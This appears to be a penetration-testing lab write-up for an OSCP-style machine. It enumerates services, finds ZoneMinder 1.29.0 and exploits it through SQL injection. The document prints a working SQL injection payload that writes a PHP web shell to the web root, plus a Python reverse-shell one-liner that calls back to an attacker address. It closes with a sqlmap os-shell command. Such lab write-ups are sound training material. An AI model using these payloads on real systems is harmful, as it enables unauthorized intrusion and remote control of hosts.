# Enumeration
`nmap -A -T4 -p- 192.168.148.52`

```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 aa:cf:5a:93:47:18:0e:7f:3d:6d:a5:af:f8:6a:a5:1e (RSA)
|   256 c7:63:6c:8a:b5:a7:6f:05:bf:d0:e3:90:b5:b8:96:58 (ECDSA)
|_  256 93:b2:6a:11:63:86:1b:5e:f5:89:58:52:89:7f:f3:42 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Pebbles
|_http-server-header: Apache/2.4.18 (Ubuntu)
3305/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
8080/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Tomcat
```


# FTP
Anon Login is not enabled.

## HTTP 80
On the main landing page we have a basic HTTP login page.

![](Images/Pasted%20image%2020250503111018.png)

```
ffuf -ic -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://192.168.148.52:80/FUZZ
ffuf -ic -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://192.168.148.52:80/FUZZ.php
```

```
images                  [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 43ms]
css                     [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 41ms]
javascript              [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 43ms]
zm                      [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 41ms]
```

Zm directory leads us to `ZoneMinder Console - Running - default v1.29.0`

![](Images/Pasted%20image%2020250503112809.png)

Using searchsploit we find this version is vulnerable to plenty of things

![](Images/Pasted%20image%2020250503112902.png)


# Exploit

SQL Injection Payload (Practice without SQL Map)

```
view=request&request=log&task=query&limit=100;(SELECT * FROM (SELECT(SLEEP(5)))OQkj)#&minTime=1466674406.084434
```

![](Images/Pasted%20image%2020250503113315.png)

Lets try to use the payload to get a web shell payload.

```
view=request&request=log&task=query&limit=100;SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "/var/www/html/webshell.php"#&minTime=1466674406.084434
```

It appears this was able to write properly.

![](Images/Pasted%20image%2020250503114059.png)

I need to use a reverse shell because web shells are not accepted on the OSCP.

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.244",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash"])'
```

```
http://192.168.148.52:3305/webshell.php?cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.45.244%22,80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([%22/bin/bash%22])%27
```

![](Images/Pasted%20image%2020250503115207.png)

Upgrade shell

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```
sqlmap http://192.168.148.52/zm/index.php --data="view=request&request=log&task=query&limit=100&minTime=5" --os-shell
```
